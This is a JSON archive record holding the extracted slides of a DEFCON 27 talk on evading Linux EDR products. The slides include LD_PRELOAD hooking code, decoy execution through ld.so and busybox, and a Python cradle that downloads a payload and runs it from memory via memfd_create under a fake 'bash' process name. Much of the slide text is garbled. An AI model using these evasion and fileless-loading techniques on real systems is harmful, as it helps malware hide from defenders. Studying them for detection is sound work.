{
    "id": "ec58781c-eef7-45f9-a021-2518e0584c3c",
    "created_at": "2023-02-18T02:07:30.073611Z",
    "updated_at": "2025-03-27T02:16:26.376563Z",
    "deleted_at": null,
    "sha1_hash": "fdefb54b0055be972b53679cd3484f558efcc916",
    "title": "2019-08-08 - Zombie Ant Farm - Practical Tips for Playing Hide and Seek with Linux EDRs",
    "authors": "",
    "file_creation_date": "2019-07-29T00:37:46Z",
    "file_modification_date": "2019-07-29T00:37:46Z",
    "file_size": 14902458,
    "plain_text": "### ! !\n\n# Zombie Ant Farm\n\n### !\n\n###### Practical Tips for Playing Hide and Seek with Linux EDRs\n\n## DEFCON 27\n\n###### @Op_Nomad\n\n\n### !\n\n\n### !\n\n\n-----\n\n###### $\n\n#### Dimitry Snezhkov\n\n###### • Technologist\n • Member of the X-Force Red Team\n\n\n###### ü hacking ü tools, research ü all things offensive\n\n\n###### @Op_Nomad github.com/dsnezhkov\n\n\n-----\n\n###### Linux Offense: The Context\n\n Linux matters\n\n • It runs 90% of cloud workloads.\n • Attacks bypass office networks and land directly in the backend.\n • Attacks follows maximum ROI (access to data or computing resources).\n • Linux Adversarial efforts may be focused and targeted. \n • Defense follows the attacker.\n Endpoint Detection and Response (EDR) solutions appear in Linux.\n • Operators have to respond\n\n\n-----\n\n###### Linux EDRs - A Case of a Mistaken Identity\n\n “Who in the world am I? Ah, that's the great puzzle.”\n\n • Pure play EDR products\n • Heuristic engine in Antivirus\n • Security Automation toolkits\n • Deployment / Patch Management\n • Side gig for app whitelisting solutions\n • As features of DLP products\n • Home grown monitoring frameworks\n • Tool assisted Threat Hunting.\n\n\n###### “Who in the world am I? Ah, that's the great puzzle.”\n\n\n-----\n\n###### Linux Offense: Strategic Sketches\n Operator has to address:\n\n • Initial foothold mechanism viability. Immediate detection.\n • Logging of activities, delayed interception and analysis.\n • Behavioral runtime patterns that trigger heuristics.\n • Persistent readiness for the long haul.\n • Evade Automation\n • Deflect tool assisted threat hunting\n\n • Proactive Supervision Context\n\n • Quiet boxes. Reliance on behavioral anomaly.\n • Locked down boxes. Reliance on known policy enforcement.\n P i h l h t\n\n\n-----\n\n###### Operational evasion:\n\n • Operationally shut down EDRs.\n • Directly exploit EDRs.\n • Blind EDR reporting and response.\n • Operationally confuse EDRs\n\n Targeted behavior evasion:\n • Target execution confusion.\n • Bypass EDR detection with novel ways of target exploitation\n • Deflect artifact discovery by Manual or Tool Assisted Threat hunting.\n\n\n-----\n\n###### Strategic Goals and Objectives, Distilled\n\n • Need a viable path to building Linux malware in the face of EDRs:\n\n • Evade detection at target runtime.\n • Hide and serve payloads in an unpredictable ways to counter “the story”.\n\n • Choice: Drop ready offensive tools on the target Ø May be outright detected. The unknown unknown.\n\n • Choice: Develop offensive tools on the target. Ø May not have tooling, footprint of presence, noise increases.\n\n • Choice: Utilization principle, aka “Living off the land” Ø May not be possible in the proactive supervision context.\n\n\n-----\n\n###### Strategic Goals and Objectives, Distilled\n\n Assembled Attack: A blended approach to break the consistent story.\n\n Idea A: Bring in clean instrumented malware cradles.\n Build iterative capabilities.\n\n Idea B: Turn good binaries into instrumented malware cradles.\n Use them as decoys.\n\n\n-----\n\n###### j\n\n Stage I: Build out Offensive Primitives\n\n • Indiscriminate “preload and release” of legitimate binaries at runtime.\n • Preload library chaining,\n \"split/scatter/assemble” of payload features.\n • Delayed payload triggers and features at runtime.\n • Rapid payload delivery mechanism prototypes with instrumented cradles.\n\n\n-----\n\n###### j\n\n Stage II: Weaponize and Operationalize Offensive Capabilities\n\n • Payload brokers, “Preload-as-a-service”. Inter-process and remote payload loading and hosting\n • Process mimicry and decoys\n • Library preloading in novel ways over memory.\n\n\n-----\n\n###### Stage I: Offensive Primitives\n\n • Basics of Offensive Dynamic Linking an Loading\n • Prototyping Offensive Mechanisms\n • Discussing Offensive Tradeoffs\n\n\n-----\n\n###### Linker wires up dynamic locations of needed libraries specified in the image.\n\n\n###### ELF\n\n\n-----\n\n###### y g\n\n Execution Error: Dynamic dependency not found…\n\n\n###### $ ./executable Error loading libctx.so\n\n\n###### Where is the dependency?\n\n $ ldd executable libctx.so.1 =>\n\n $ readelf -d executable\n 0x0000000000000001 (\n\n Dependency is resolved!\n\n\n###### $ LD_DEBUG=libs LD_LIBRARY_PATH=./lib executable\n 107824: find library=libctx.so.1 [0]; searching 107824: Found file=./lib/libctx.so.1 “Hello World!”\n\n\n-----\n\n###### Redefine and reroute KNOWN function entry points\n\n\n-----\n\n###### Generic Dynamic API Hooking Tradeoffs\n\n We are are implementing an API detour to execute foreign logic.\n\n Challenges:\n\n • Need to know the details of target API\n\n FILE *fopen(const char *pathname, const char *mode);\n\n • Invoke and avoid detection. Opsec. Known signatures for known exploits.\n • Interoperate with the target binary in a clean fashion without crashing it.\n\n • Assumption inspection tooling availability on target.\n\n\n-----\n\n###### New ideas: Viability Check\n\n Tip: Be more agnostic to the specifics of any single API in the binary.\n\n Tip: Do not subvert the target. Instead:\n\n • Compel it to execute malicious code\n • Use it as a decoy.\n\n • If you can start a process you\n likely own the entire bootstrap of this process\n\n • Preload the payload generically into a known target and\n release for execution?\n\n\n-----\n\n###### Offensive Strategy: Desired Outcomes\n\n • EDR sees the initial clean cradle, malware module loading is delayed.\n • EDR sees the code executing by approved system binaries in the process table,\n trusts the integrity of the known process.\n\n • EDR may not fully trace inter-process data handoff\n\n • preloaded malware calls on external data interchange\n • memory resident executables and shared libraries\n\n Parent / Child process relationships in Linux are transitive. We take advantage of this.\n\n • If you can start the parent process, you fully own its execution resources,\n and the resources of its progeny\n\n\n-----\n\n###### Primitives for Working with Offensive Preloading\n\n\n###### What we Want\n\n\n-----\n\n###### .INIT\n\n\n###### MAIN\n\n\n###### .FINI\n\n```\n__attribute__((section(\".init_array\"), used))\nstatic typeof(init) *init_p = init;\n__attribute__((section(\".fini_array\"), used))\nstatic typeof(fini) *fini_p = fini;\n__attribute__((section(\".preinit_array\"), used))\n\n```\n\n###### ������������� ������ ��������� ����������������� ����� �� ������������������\n\n\n-----\n\n###### 0x1 C runtime level : __libc_start_main\n\n �����������������.��..���������� main()����������.�������.����.�������� ���,�.�����������.��� �\n\n```\nmain_orig = main;\ntypeof(&__libc_start_main) orig =\n dlsym(RTLD_NEXT, \"__libc_start_main\");\nreturn orig(main hook argc argv init fini\n\n```\n\n###### Is it optimal?\n\n\n-----\n\n###### 0x2 – Linker Level: Weakrefs\n\n```\nvoid debug() __attribute__((weak));\n\n```\n\n###### ü Controlled Weak Refs\n\n ü Foreign Weak Refs\n\n ü Chained Weak Refs\n\n```\nvoid main(){\n  if (debug)\n     debug();\n}\n\n```\n```\n$ nm --dynamic /bin/ls | grep 'w '\nw __cxa_finalize\nw __gmon_start__\n\n```\n```\nvoid mstat(){\n\n```\n\n###### Chain2.so\n\n\n-----\n\n###### __ __(( ( )))\n\n```\nvoid before_main(void) __attribute__((constructor ));\nvoid after_main(void) __attribute__((destructor ));\n\n```\n```\nvoid before_main(void) __attribute__((constructor (101)));\nvoid after_main(void) __attribute__((destructor(65534)));\n\n```\n\n###### ���,��)��)����,�,)�,�����)�,��\"����)��������������� ��������\n\n • �,�,�����������������)����,���������\n • �.)��,��)���(��������,���������������)����,���������\n • ���)��������,��)�,�������)��)����,��������������������\n • ��,���)�,���)�� ���\n\n\n-----\n\n###### g, p, g\n\n Let’s keep breaking the EDR \"story\" of execution that leads to a confirmed IoC\n\n\n###### ü Out of Band\n signals. ü Fault Branching ü Self-triggered fault\n recovery ü Exception\n Handlers ü Timed execution\n\n```\n$LD_PRELOAD=lib/libinterrupt.so bin/ls\nTrigger SIGFPE handler\nIn SIGFPE handler\n1 / 0: caught division by zero!\nE ti l d h\n\n```\n```\nvoid fpe_handler(int signal, siginfo_t *w,\nvoid *a)\n{\n    printf(\"In SIGFPE handler\\n\");\n    siglongjmp(fpe_env, w->si_code);\n}\n\n```\n\n-----\n\n###### 0x6 Back to Basics: Protecting Payloads\n\n\n\n###### • Rootkit style LD_PRELOAD cleanup (proc)\n • Obfuscation (compile time)\n • Runtime Encryption (memory)\n • Runtime situational checks\n • Better context mimicry\n • Access to EDRs to prove the exact primitives\n • No “main” no pain?\n • Alternative loaders\n\n```\nint _(void);\nvoid __data_frame_e()\n{\n  int x = _();\n  exit(x);\n}\nint _() {}\n\n```\n```\n// Dynamic assignment to .interp section:\nconst char my_interp[] __attribute__((section(\".interp\"))) =\n\"/usr/local/bin/gelfload-ld-x86 64\";\n\n```\n\n-----\n\n###### Expanding and Scaling the Evasion Capabilities\n\n We now have some evasion primitives to work with. Nice. Let’s expand the evasion.\n\n Highlights:\n\n • Target utilization.\n • Hiding from EDRs via existing trusted binary decoys.\n • Dynamic scripting capabilities in the field.\n • Progressive LD_PRELOAD command line evasion.\n • Malware preloaders with self-preservation instincts.\n\n\n-----\n\n###### HOW MANY TIMES CAN YOUR PROCESS REGEX FAIL\n\n • System binaries that run other binaries.\n • Great decoys already exist on many Linux systems.\n\n • ld.so is a loader that can run executables directly as parameters. ld.so is always approved (known good)\n • busybox meta binary is handy.\n\n Combine the two to escape process pattern matching defensive engines?\n\n Bounce off something trusted and available to break the path of analysis\n\n\n-----\n\n###### � �3���,.�3���������.��,�������������,�\n```\n$ LD_PRELOAD=payload.so\n    /lib64/ld-linux-x86-64.so.2 /bin/busybox run-parts --regex '^main_.*$' ./bin/\n\n � ��������3�4���,�3��\n$ mkdir /tmp/shadowrun; ln -s /bin/ls /tmp/shadowrun/ls;\n    LD_PRELOAD=payload.so\n        /lib64/ld-linux-x86-64.so.2 /bin/busybox run-parts /tmp/shadowrun/\n\n � �2,3�3�1���,�3�����3������311���\necho | LD_PRELOAD=payload.so\n    /lib64/ld-linux-x86-64.so.2 /bin/busybox timeout 1000 /bin/ls\n\n � ��,����3,�������3�.2���� ��� ��,���������2���������3�.2�����\n$ LD_PRELOAD=payload.so\n    /lib64/ld-linux-x86-64.so.2\n\n```\n\n-----\n\n###### Interface with a higher level code for greater evasion.\n\n Rapid prototyping and development of modular malware.\n\n • speed of development\n • better upgrades\n • memory safety\n\n ü Offense to retool quickly on the target box. ü \"evade into reflection”.\n Faced with dynamic code EDRs get lost in reflection tracing a call chain to a verified IoC. ü Extend malware into preloading code from dynamic languages with decent FFI\n\n\n-----\n\n```\ngo build -o shim.so -buildmode=c-shared shim.go\n\n```\n```\npackage main\nimport \"C\"\nimport (\n    \"fmt\"\n)\nvar count int\n\n```\n\n###### DFIR: Reverse 2059 functions as a starting point ...\n\n```\n//export Entry\nfunc Entry(msg string) int {\n    fmt.Println(msg)\n    return count\n}\nfunc main() { // don’t care, or wild goose chase }\n\n```\n\n-----\n\n```\n#include <lua.h>\n#include <lauxlib.h>\n#include <lualib.h>\nint main(int argc, char** argv)\n{\n  lua_State *L;\n  L = luaL_newstate();\n  luaL_openlibs(L);\n  /* Load the Lua script */\n  if (luaL_loadfile(L, argv[1]))\n    /* Run Lua script */\n    lua_pcall(L, 0, 0, 0)\n  lua_close(L);\n}\n\n```\n\n###### Main() is nothing more than a preloaded constructor at this point\n\n • EDRs lose trail if you\n escape out to scripting\n • start loading other libraries at runtime.\n\n Pro-tip: Use it as another abstraction layer, e.g. socket out or pipe to another process hosting additional payloads\n\n```\n$LD_LIBRARY_PATH=.\nLD_PRELOAD=./liblua.so\n./invoke_lua hello.lua\n\n```\n\n-----\n\n###### Summary: Ain’t No Primitive Primitives.\n\n\n-----\n\n###### Stage II: Weaponizing and Operationalizing Payloads\n\n ü Uber preloaders ü Inline Parameterized Command Evasion. ü Memory-resident Malware Modules. ü Modular Malware Payload Warehouses ü Remote module loads ü Utilizable loaders\n\n\n-----\n\n```\n$LD_PRELOAD=./lib/libctx.so.1 /bin/ls <preloader_arguments>\n\n```\n```\n__attribute__((constructor)) static void\n_mctor(int argc, char **argv, char** envp)\n{\n   // Save pointers to argv/argc/envp\n   largv=argv;\n   largc=argc;\n   lenvp=envp;\n   lenvp_start=envp; /* code here */\n\n###### }\n\n```\n\n\n###### • ������.��������������.�������\n\n • ��������������������.������������� ��.����\n\n\n-----\n\n###### Uber Preloaders\n\n\n###### � ��������������\n\n```\nLD_BG=\"false\" LD_PCMD=\"r:smtp\" LD_MODULE=\"./lib/shim.so” LD_MODULE_ARGS=\"hello\" \\\nLD_PRELOAD=./lib/libctx.so.1 /bin/ls\n\n```\n\n##### $\n\n\n-----\n\n###### Chains may still\n\n • dlopen() a module or use weak references\n • Adhere to API contracts\n • Implement Process mimicry and decoys\n • Switch on IPC communication and data signaling\n • Clean out artifacts (a la rootkit)\n\n```\n// resolve Entry symbol\nint (*entry)(char *) = dlsym(handle, \"Entry\");\n\n```\n\n###### // Call FFI stack\n\n```\n//pass arguments along if any\nif ( (modload_args_t = (char*) getenv(\"LD_MODULE_ARGS\")) != NULL ){\n  modload_args = strdup(modload_args_t);\n  modload_args_len = strlen(modload_args);\n}\n\n```\n\n-----\n\n###### Memory-resident malware modules\n\n One small problem: those modules are files.\n\n • On disk.\n • Scannable and inspectable by EDRs.\n • And admins.\n\n Sometimes it’s OK (EDR identity crisis). We still want flexibility.\n\n The way to fix that is to\n load modules in memory. OS is happy execute them from memory. OS is not happy. Let’s make it happy.\n\n\n-----\n\n###### Memory-resident malware modules\n\n Several ways to operate files in shared memory in Linux:\n\n • tmpfs filesystem (via /dev/shm), if mounted; have to be root to mount\n others.\n • POSIX shared memory, memory mmap()'d files.\n```\no Some, you cannot obtain execution of code from.\no Others, do not provide you fully memory based abstraction, leaving a file\n\n path visible for inspection.\n\n Kernel 3.17 Linux gained a system call memfd_create(2) (sys_356/319)\n\n```\n\n-----\n\n###### y\n\n```\nshm_fd = memfd_create(s, MFD_ALLOW_SEALING);  \nif (shm_fd < 0) {\n  log_fatal(\"memfd_create() error\");\n}\n\n```\n\n\n###### • ���3�������,���)���� �3������(�����\n • �3����()����(������������3��\n ��3 readlink(3) ����3��\n • �3����������)���3��������3��\n\n\n-----\n\n###### Uber preloader PID 56417, Meet your Volatile Memory\n\n What we have\n\n```\nLD_PCMD=\"r:smtp\" LD_MODULE=\"./lib/shim.so\" LD_MODULE_ARGS=\"hello\"\nLD_PRELOAD=./lib/libctx.so.1 /bin/ls\n\n```\n\n#### !\n\n\n#### !\n\n\n###### What we want\n\n```\nLD_PCMD=\"r:smtp\" LD_MODULE=“/proc/56417/fd/3\" LD_MODULE_ARGS=\"hello\"\nLD_PRELOAD=./lib/libctx.so.1 /bin/ls\n\n```\n\n### \"\n\n\n### \"\n\n\n###### ����������������� 56417 ���������������������������������\n\n\n-----\n\n-----\n\n###### p\n\n ZAF - Zombie Ant Farm\n\n • ����������� ���������������������������������/���.������.���� �\n\n • �������.������������������,���������������������/�/���\n\n • ���������������������//��������������.���.�����������/����/�.�����\n ����������\n\n • ���������������� ����������������������,������/���.��/�/����\n ��������,.�������,�����\n\n\n-----\n\n###### ZAF Module Loader and Payload Driver\n\n • Fetches remote payloads and stores them in\n memory.\n\n • Runs an in-memory list of available modules,\n opens payloads to all local preloaders.\n\n • Has OS evasion and self-preservation instincts.\n\n • Can mimic a specified process name.\n\n • At the request of an operator\n de-stages malware modules.\n\n\n-----\n\n###### ZAF Preloader Synergy\n\n • Take payload from ZAF process memory space\n • Reference payload via Uber-Preloader,\n • Preload payload (or chain) into the target\n\n 56417 2[nd] order shim\n\n```\nLD_MODULE=\"/proc/56417/fd/3\"\nLD_PRELOAD=./libctx.so.1 /bin/ls\n\n```\n\n###### 1[st] order shim\n```\n56417 ZAF M h ldi l d\n\n```\n```\n          56417\n\n```\n\n-----\n\n###### ZAF Payload Broker Service\n\n Preloaded shims or subverted system exec\n\n\n###### Uber Preloader pipeline\n\n\n##### 3\n\n 1\n\n 2\n\n###### Uber Preloader pipeline\n\n\n-----\n\n###### PyPreload: Operationali ing ynamic Preload Cradles\n\n ����������������.�����������������.�����������������.�,\n\n �����������������������.���.����.���.����������������.����������\n\n �.�.�,�������������������� memfd_create()������ ctypes ����.��������\n\n```\nos.write(getMemFd, urllib2.urlopen(url))\ndef getMemFd(seed):\n  if ctypes.sizeof(ctypes.c_voidp) == 4:\n    NR_memfd_create = 356\n  else:\n    NR_memfd_create = 319\n  modMemFd = ctypes.CDLL(None).syscall(NR_memfd_create,seed,1)\n    dM P th \"/ /\" t ( t id()) \"/fd/\" t ( dM Fd)\n\n```\n\n-----\n\n###### y ( y / y) y\n\n ����������������������������������������������������������\n\n```\n$ pypreload.py -t so -l\nhttp://127.0.0.1:8080/libpayload.so -d bash -c /bin/ls\n\n```\n\n###### �������������������� ��������������� bash ����.��� ls\n\n```\n56417 pts/6 S+ 0:00 | | | \\_ bash\n56418 pts/6 S+ 0:00 | | | \\_ /bin/ls\n\n```\n\n###### Note: bash here is the decoy for the process name we use for the process table, we do not use any bash functionality. “Bash” just looks good for Threat hunters\n\n\n-----\n\n###### y ( y / y) y\n\n (�,������������)(����2������������������-���������������� ���������)���,��\n\n```\n$ pypreload.py -t bin -l http://127.0.0.1:8080/zaf -d bash\n\n```\n\n###### File Descriptors of the preload cradle\n\n\n###### $ ls -l /proc/56509/fd/ lr-x------ 1 root root 64 Feb 17 18:08 0 -> /dev/null l-wx------ 1 root root 64 Feb 17 18:08 1 -> /dev/null lrwx------ 1 root root 64 Feb 17 18:08 2 -> /dev/null lrwx------ 1 root root 64 Feb 17 18:08 3 -> '/memfd:fa37Jn (deleted)' lrwx------ 1 root root 64 Feb 17 18:08 5 -> 'socket:[3479923]'\n\n\n###### Strace sees:\n\n\n###### 56880 18:26:52.395703 memfd_create(\"R6YP4OOR\", MFD_CLOEXEC) = 3 56884 18:26:52.586221 readlink(\"/proc/self/exe\", \"/memfd:R6YP4OOR (deleted)\", 4096) = 25 56886 18 26 52 632680 memfd create(\"fa37Jn\" MFD CLOEXEC) 4\n\n\n-----\n\n###### y p y\n\n\n##### 1\n\n\n##### 2\n 4\n\n 3\n\n\n-----\n\n###### Additional Tips and Research Roadmap\n 1. ASLR at-start weakening\n\n • Weaken targets via predictable memory addresses\n • Load to static address or an artificial code cave.\n\n Linux execution domains <sys/personality.h>\n ADDR_NO_RANDOMIZE (since Linux 2.6.12) Parent -> set personality -> Fork() -> UNRANDOMIZED process\n\n 2. Cross Memory Attach\n\n • Artificial Code Caves\n • IPC evasion (User to User space vs. User to Kernel to User space)\n process_vm_readv(), process_vm_writev()\n\n\n-----\n\n###### Additional Tips and Research Roadmap\n\n\n-----\n\n###### Additional Tips and Research Roadmap\n\n\n-----\n\n###### Offensive Summary\n\n ü Preloading is a viable path to evasion via system executables. ü Bring clean cradles to build on, or use executables on the target as decoys. ü Use assembled attack. Split/Scatter/Assemble techniques vs. EDRs. ü Out-of-process payload delivery is sometimes what you need.\n “Preloader-as-a-Service” over memory is possible. ü C FFI is the common denominator for interop on Linux, and can be used\n for evasion. ü Don’t kill a fly with a sword (even though you know you want to).\n But do turn chopsticks into swords when needed. ü Protect your payloads and payload delivery mechanisms.\n\n Code: https://github.com/dsnezhkov/zombieant\n\n\n-----\n\n###### What can the Defense do?\n\n • Start implementing Linux capabilities.\n • Define clearly what EDRs will and can do for you.\n • Use provided ideas for manual threat hunting.\n\n • Optics into /proc. \n • Optics into dynamic loading, memfd().\n • Optics into IPC\n • Optics into process library load\n • Start thinking more about proactive contextual supervision.\n\n\n-----\n\n###### EOF\n\n##### SYN & ACK?\n\n\n###### Thank you!\n\n\n### !\n\n\n### !\n\n\n-----\n\n###### Useful Links (Thanks!)\n\n https://x-c3ll.github.io/posts/fileless-memfd_create/\n\n https://0x00sec.org/t/super-stealthy-droppers/3715\n\n https://github.com/lattera/glibc/blob/master/csu/gmon-start.c\n\n https://github.com/dvarrazzo/py-setproctitle/tree/master/src\n\n https://haxelion.eu/article/LD_NOT_PRELOADED_FOR_REAL/\n\n https://gist.github.com/apsun/1e144bf7639b22ff0097171fa0f8c6b1\n\n\n-----",
    "language": "EN",
    "sources": [
        {
            "id": "05d7b179-7656-44d8-a74c-9ab34d3df3a2",
            "created_at": "2023-01-12T14:38:44.599904Z",
            "updated_at": "2023-01-12T14:38:44.599904Z",
            "deleted_at": null,
            "name": "VXUG",
            "url": "https://www.vx-underground.org",
            "description": "vx-underground Papers",
            "reports": null
        }
    ],
    "references": [
        "https://papers.vx-underground.org/papers/Linux/Evasion/2019-08-08 - Zombie Ant Farm - Practical Tips for Playing Hide and Seek with Linux EDRs.pdf"
    ],
    "report_names": [
        "2019-08-08 - Zombie Ant Farm - Practical Tips for Playing Hide and Seek with Linux EDRs.pdf"
    ],
    "threat_actors": [
        {
            "id": "75108fc1-7f6a-450e-b024-10284f3f62bb",
            "created_at": "2024-11-01T02:00:52.756877Z",
            "updated_at": "2025-03-27T02:00:55.544216Z",
            "deleted_at": null,
            "main_name": "Play",
            "aliases": null,
            "source_name": "MITRE:Play",
            "tools": [
                "Nltest",
                "AdFind",
                "PsExec",
                "Wevtutil",
                "Cobalt Strike",
                "Playcrypt",
                "Mimikatz"
            ],
            "source_id": "MITRE",
            "reports": null
        }
    ],
    "ts_created_at": 1676686050,
    "ts_updated_at": 1743041786,
    "ts_creation_date": 1564360666,
    "ts_modification_date": 1564360666,
    "files": {
        "pdf": "https://archive.orkl.eu/fdefb54b0055be972b53679cd3484f558efcc916.pdf",
        "text": "https://archive.orkl.eu/fdefb54b0055be972b53679cd3484f558efcc916.txt",
        "img": "https://archive.orkl.eu/fdefb54b0055be972b53679cd3484f558efcc916.jpg"
    }
}